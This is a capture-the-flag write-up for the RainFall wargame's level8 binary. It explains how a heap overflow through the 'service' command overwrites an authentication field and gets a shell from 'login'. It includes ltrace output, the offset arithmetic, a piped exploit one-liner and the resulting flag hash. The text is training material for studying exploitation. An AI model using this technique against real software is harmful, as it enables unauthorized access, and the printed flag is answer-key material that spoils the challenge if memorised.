# Analysis of the Binary

We've successfully extracted the source code from the binary. Here's an analysis of the key functionalities:

## Key Observations
- Multiple commands can be executed in any order.
- The `login` command checks a user structure for authentication status. If authenticated, it grants shell access.
- `auth` allocates memory for the user structure.
- `service` is a command with a `strdup` call, vulnerable to buffer overflow.

# Exploit Strategy

Observing that the user structure is allocated on the heap and the `service` command is susceptible to a buffer overflow, we can manipulate this to overwrite the user structure. This would trick the `login` command into granting us shell access.

## Steps for Exploitation
1. Use `auth` to allocate the user structure.
2. Use `service` to overflow the structure.
3. Execute `login` to verify authentication and obtain a shell.

## Calculating the Offset

Using `ltrace`, we can track the `malloc` and `strdup` calls to determine the offset between the user structure and the buffer:

```bash
$ ltrace ./level8
__libc_start_main(0x8048564, 1, 0xbffff7f4, 0x8048740, 0x80487b0 <unfinished ...>
printf("%p, %p \n", (nil), (nil)(nil), (nil)
)                                                               = 14
fgets(auth
"auth \n", 128, 0xb7fd1ac0)                                                               = 0xbffff6d0
malloc(4)                                                                                       = 0x0804a008
strcpy(0x0804a008, "\n")                                                                        = 0x0804a008
printf("%p, %p \n", 0x804a008, (nil)0x804a008, (nil)
)                                                           = 18
fgets(service
"service\n", 128, 0xb7fd1ac0)                                                             = 0xbffff6d0
strdup("\n")                                                                                    = 0x0804a018
[...]
level8@RainFall:~$
```

- The `malloc` call for the user structure returns `0x0804a008`.
- The `strdup` call returns `0x0804a018`.
- The distance between these addresses is `0x10` (16 bytes).
- Considering the user structure layout, the `is_auth` field is 32 bytes from the start.
- The required offset to overwrite `is_auth` is `32 - 16 = 16`.

## Executing the Exploit

Here's the sequence of commands to perform the exploit:

```bash
$ (echo "auth "; python -c 'print("service" + "A"*16)'; echo "login"; cat) | ./level8
```

1. `auth `: Allocates the user structure.
2. `python -c 'print("service" + "A"*16)'`: Overflows the buffer to overwrite `is_auth`.
3. `login`: Checks if the user is authenticated and, due to the overflow, grants shell access.
4. `cat`: Keeps the shell open to execute further commands.

Result:

```plaintext
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

The exploit successfully manipulates the program's behavior to gain unauthorized access.
